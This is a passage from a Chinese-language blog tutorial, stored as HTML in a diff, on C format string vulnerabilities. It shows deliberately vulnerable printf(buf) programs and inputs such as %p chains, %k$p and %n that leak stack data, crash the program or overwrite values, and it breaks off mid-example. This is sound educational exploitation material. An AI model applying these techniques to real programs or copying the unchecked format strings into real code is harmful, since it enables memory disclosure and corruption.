@@ -1,0 +1,1025 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="梓曰">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="格式化字符串 格式化字符串函数 常见的有格式化字符串函数有  输入  scanf   输出     函数 基本介绍     printf 输出到 stdout   fprintf 输出到指定 FILE 流   vprintf 根据参数列表格式化输出到 stdout   vfprintf 根据参数列表格式化输出到指定 FILE 流   sprintf 输出到字符串   snprintf 输出指定字节">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Autumnal">
+<meta property="og:url" content="https://equinox-shame.github.io/2025/10/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html">
+<meta property="og:site_name" content="Autumnal">
+<meta property="og:description" content="格式化字符串 格式化字符串函数 常见的有格式化字符串函数有  输入  scanf   输出     函数 基本介绍     printf 输出到 stdout   fprintf 输出到指定 FILE 流   vprintf 根据参数列表格式化输出到 stdout   vfprintf 根据参数列表格式化输出到指定 FILE 流   sprintf 输出到字符串   snprintf 输出指定字节">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2080041/202206/2080041-20220621222329200-1787154087.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2080041/202206/2080041-20220621215906995-1907993458.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/17/Qnpr5vzte6jXq1R.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/17/BzKOeTkxqp6cMAG.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/sIrGOKAd4czwxmC.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/PmYnaFWdDIEbhQC.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/1mNUg2J7LHDolVf.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/nxevTrupD4EZ17I.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/lC971rqHMYWTEKk.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/GiRpb3XOJzDaAm4.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/TQwDJEtB8YbGyaR.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/brmZA7K1yDd89B2.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/GOwE2ZPSWQgat5C.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/iZknoXuljUhwLYJ.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/5yIodHLagP786lW.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/E5OfezZwvsArPYa.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/20/wbiJFkaXLBUSAQc.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/21/CNdhKuwWvZ9tAcP.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/27/ecB9XQNWL8PdvOa.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/27/v8UVXL3rlAWy67g.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/27/dCm5ypDcPLoJgAU.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/27/OzGsltY5pNmarfH.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/28/JEruOnsBD5TNv6b.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/28/ixYjwEokyeBTPXs.png">
+<meta property="og:image" content="https://s2.loli.net/2025/10/28/TyfFAjroeMZwBQR.png">
+<meta property="article:published_time" content="2025-10-28T08:26:34.500Z">
+<meta property="article:modified_time" content="2025-10-28T08:09:33.925Z">
+<meta property="article:author" content="梓曰">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/2080041/202206/2080041-20220621222329200-1787154087.png">
+  
+  
+  
+  <title>Autumnal</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"equinox-shame.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","app_key":"GQdXw2PjI9DScgw5QHVCZeYm","server_url":"https://2am6iuuw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Autumnal Equinox</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-28 16:26" pubdate>
+          2025年10月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.7k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>格式化字符串</h1>
+<h2 id="格式化字符串函数">格式化字符串函数</h2>
+<p>常见的有格式化字符串函数有</p>
+<ul>
+<li>输入
+<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">基本介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">printf</td>
+<td style="text-align:center">输出到 stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">fprintf</td>
+<td style="text-align:center">输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td style="text-align:center">vprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">vfprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td style="text-align:center">sprintf</td>
+<td style="text-align:center">输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">snprintf</td>
+<td style="text-align:center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsnprintf</td>
+<td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">setproctitle</td>
+<td style="text-align:center">设置 argv</td>
+</tr>
+<tr>
+<td style="text-align:center">syslog</td>
+<td style="text-align:center">输出日志</td>
+</tr>
+<tr>
+<td style="text-align:center">err, verr, warn, vwarn 等</td>
+<td style="text-align:center">…</td>
+</tr>
+</tbody>
+</table>
+<h2 id="参数类型">参数类型</h2>
+<p>格式化子字符串重点部分便是其格式化输出的参数，其格式化控制属性格式如下：</p>
+<blockquote>
+<p>%[ <font color="ligreen">flags</font> ][ <font color="orange">width</font> ][ <font color="cyan">.precision</font> ][ <font color="ligblue">length</font> ] <font color="deeppink">type</font><br>
+%[ <font color="ligreen">标志</font> ][][][ <font color="orange">最小宽度</font> ][ <font color="cyan">.精度</font> ][ <font color="ligblue">类型长度</font> ] <font color="deeppink">类型</font></p>
+<p>常见标志：</p>
+<img src="https://img2022.cnblogs.com/blog/2080041/202206/2080041-20220621222329200-1787154087.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+<p>常见类型</p>
+<p>常用 n (用于格式化漏洞)、x、p、s (输出字符串)：</p>
+<img src="https://img2022.cnblogs.com/blog/2080041/202206/2080041-20220621215906995-1907993458.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+<p>常见类型长度 (需要额外关注 <code>h</code>、<code>hh</code>)</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>hh</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>h</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>l</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个<code>long</code>尺寸的整型参数。对于浮点类型，<code>printf</code>期待一个<code>double</code>尺寸的整型参数。对于字符串s类型，<code>printf</code>期待一个<code>wchar_t</code>指针参数。对于字符c类型，<code>printf</code>期待一个<code>wint_t</code>型的参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ll</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个<code>long long</code>尺寸的整型参数。Microsoft也可以使用<code>I64</code>。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>L</code></td>
+<td style="text-align:center">对于浮点类型，<code>printf</code>期待一个<code>long double</code>尺寸的整型参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>z</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个<code>size_t</code>尺寸的整型参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>j</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个<code>intmax_t</code>尺寸的整型参数。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>t</code></td>
+<td style="text-align:center">对于整数类型，<code>printf</code>期待一个<code>ptrdiff_t</code>尺寸的整型参数。</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<p>比较值得注意的是在非 C99 标准的 POSIX 扩展支持了一个 <code>Parameter</code></p>
+<p>其对应的格式为 <code>%[parameter][flags][width][.precision][length]type</code>，以下面的例子进行说明：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">//1$代表参数&quot;a&quot; --&gt;第一个参数的意思</span><br>    <span class="hljs-comment">//*代表宽度</span><br>    <span class="hljs-comment">//3$代表参数&quot;10&quot; --&gt;第3个参数的意思</span><br>    <span class="hljs-comment">//输出右对其10空格，并且输出字符串a.</span><br>    <span class="hljs-comment">//后面以此类推。</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%1$*3$s\n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%1$*4$s\n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2$*3$s\n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2$*4$s\n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>运行后结果如图：</p>
+<p><img src="https://s2.loli.net/2025/10/17/Qnpr5vzte6jXq1R.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<blockquote>
+<p>其相当于是输出：<code>第一个参数内容 + 第二个参数个空格</code> 进行右对齐</p>
+</blockquote>
+<h2 id="漏洞形成">漏洞形成</h2>
+<p>对于 <code>printf</code> 类函数，我们给定的参数会在栈上进行传递而打印出对应的值，当我们不在提供对应的栈上参数时便可以进行泄露栈上地址对应的值</p>
+<h3 id="例一">例一</h3>
+<p>以下面代码为例：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d %s %x %x %x %3$s&quot;</span>,<span class="hljs-string">&quot;Hello World!&quot;</span>,<span class="hljs-number">233</span>,<span class="hljs-string">&quot;\n&quot;</span>); <span class="hljs-comment">// %3$s 为换行</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>编译参数为：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">gcc -fno-stack-protector -no-pie <span class="hljs-built_in">demo</span>.c -m32 -o <span class="hljs-built_in">demo</span><br></code></pre></td></tr></table></figure>
+<p>可以看到的是我们值提供了三个参数，那么使用 <code>pwngdb</code> 进行调试可以看到在 <code>printf</code> 内将我们对应输入的参数进行置入栈中，而栈上还有放入了一些没有输入的内容</p>
+<p><img src="https://s2.loli.net/2025/10/17/BzKOeTkxqp6cMAG.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<blockquote>
+<p>调试时可以使用 stack num 显示栈上多少个数据</p>
+</blockquote>
+<p>可以看到对应栈上的内容被打印了，执行后可以看到对应输出为：</p>
+<p><img src="https://s2.loli.net/2025/10/20/sIrGOKAd4czwxmC.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>证明了在没有给出参数的情况下，其依然可以输出栈上的值</p>
+<h3 id="例二">例二</h3>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//字符数组，50字节空间。</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">50</span>];<br>    <br>    <span class="hljs-comment">//让用户输入任何数据，大小50字节。</span><br>    <span class="hljs-built_in">fgets</span>(buf,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf),stdin);<br>    <br>    <span class="hljs-comment">//输出用户输入的任何数据</span><br>    <span class="hljs-built_in">printf</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>上述代码中我们可以自己控制对应的格式化参数信息，当我们控制输入参数为：<code>%p %p %p %p %p %p %p</code> 时，我们尝试进行调试一下：</p>
+<p><img src="https://s2.loli.net/2025/10/20/PmYnaFWdDIEbhQC.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>对应的输出为：</p>
+<p><img src="https://s2.loli.net/2025/10/20/1mNUg2J7LHDolVf.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>成功将栈上数据进了打印，同时因为此题的特殊性还可以自定泄露内容的多少</p>
+<blockquote>
+<p>上述两个例子均为 x32 下的，对于 x64 利用较为不同</p>
+</blockquote>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>对于格式化字符串漏洞的利用主要有：</p>
+<ul>
+<li>使程序崩溃(测试漏洞是否存在)</li>
+<li>栈数据泄露(栈数据读)</li>
+<li>栈数据覆盖(栈数据写)</li>
+<li>任意地址内存泄露(任意读)</li>
+<li>任意地址内存覆盖(任意写)</li>
+</ul>
+<h3 id="x32">x32</h3>
+<h4 id="程序崩溃">程序崩溃</h4>
+<p>源码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span> str[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,str,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(str);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>输入过多的 %s 会一直从栈上取字符串，当取到不属于用户态的一些内容或者是该地址内容不能解析为字符串，便会出现崩溃，导致程序结束</p>
+<blockquote>
+<p>栈上的值并不是指向字符串的指针，而是字符串的实际内容，因此则有：</p>
+<ul>
+<li>
+<p>%s 会导致程序崩溃，因为它会把这些值当作指针去解引用</p>
+</li>
+<li>
+<p>%p 则不会进行解引用，所以不会导致崩溃</p>
+</li>
+</ul>
+</blockquote>
+<p><img src="https://s2.loli.net/2025/10/20/nxevTrupD4EZ17I.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="数据泄露">数据泄露</h4>
+<p>源码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>通过格式化字符串可以进行泄露栈上对应的地址信息</p>
+<p><img src="https://s2.loli.net/2025/10/20/lC971rqHMYWTEKk.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>简单调试一下也可以看出来：</p>
+<p><img src="https://s2.loli.net/2025/10/20/GiRpb3XOJzDaAm4.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>我们如果再仔细观察一下数据 <code>0x70383025</code> 可以看到其为我们的输入：</p>
+<img src="https://s2.loli.net/2025/10/20/TQwDJEtB8YbGyaR.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
+<h4 id="获取栈变量数值">获取栈变量数值</h4>
+<p>在上面数据泄露一步中我们看到了其可以泄露出我们的输入的 <code>%08p</code> 那么根据之前使用到的 <code>%k$p</code> 来获取第 <code>k+1</code> 个参数</p>
+<blockquote>
+<p><a id="参数说明"></a></p>
+<p>为什么这里要说是对应第 k+1 个参数呢？</p>
+<p>其中 k 表示栈中格式字符串后面的第 k 个值，那相对于输出函数来说，就是第 k+1 个参数了</p>
+</blockquote>
+<p>那么还是以上一个例子为例，我们输入 <code>%4$p</code>，后可以看到其直接输出了我们对应的 <code>%4$p</code></p>
+<p><img src="https://s2.loli.net/2025/10/20/brmZA7K1yDd89B2.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但是如果使用 <code>%4$s</code> 来直接打印出我们的输入信息会得到以下结果</p>
+<p><img src="https://s2.loli.net/2025/10/20/GOwE2ZPSWQgat5C.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这是为什么？或许简单的调试一下能够给予答案</p>
+<img src="https://s2.loli.net/2025/10/20/iZknoXuljUhwLYJ.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
+<p>使用 <code>x</code> 可以看到 <code>eax</code> 指向的地址 <code>0xffffce00</code> 处内容，但是尝试进行访问则会发现没有权限，因此会导致程序崩溃</p>
+<p><img src="https://s2.loli.net/2025/10/20/5yIodHLagP786lW.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="栈数据覆盖">栈数据覆盖</h4>
+<p>其核心在于 <code>%n</code> 的使用，其会将函数产生的输出字符串的长度进行保存到对应的参数中</p>
+<p><a id="%n"></a>以下面的例子来再次回顾对应的 <code>%n</code> 的使用</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> number=<span class="hljs-number">0</span>;<span class="hljs-comment">//这里number被赋为0</span><br>    <span class="hljs-keyword">char</span> str[] = <span class="hljs-string">&quot;hello&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s1111111111111111%n\n&quot;</span>,str,&amp;number);<span class="hljs-comment">//这里number 利用 %n 赋值为回显的长度</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,number);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到 <code>number</code> 的值已经被我们修改，其值为 <code>len(&quot;hello1111111111111111&quot;)</code> 的长度</p>
+<p><img src="https://s2.loli.net/2025/10/20/E5OfezZwvsArPYa.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>进行一些简单的调试，可以发现栈上数据 <code>0xffffce58 -&gt; 0xffffce6c</code> 对应的值修改为了 0x15</p>
+<p><img src="https://s2.loli.net/2025/10/20/wbiJFkaXLBUSAQc.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>我们简单的修改一下代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> number=<span class="hljs-number">0</span>;<span class="hljs-comment">//这里number被赋为0</span><br>    <span class="hljs-keyword">char</span> str[] = <span class="hljs-string">&quot;hello&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s1111111111111111%n\n&quot;</span>,str,&amp;number);<span class="hljs-comment">//这里number 利用%n 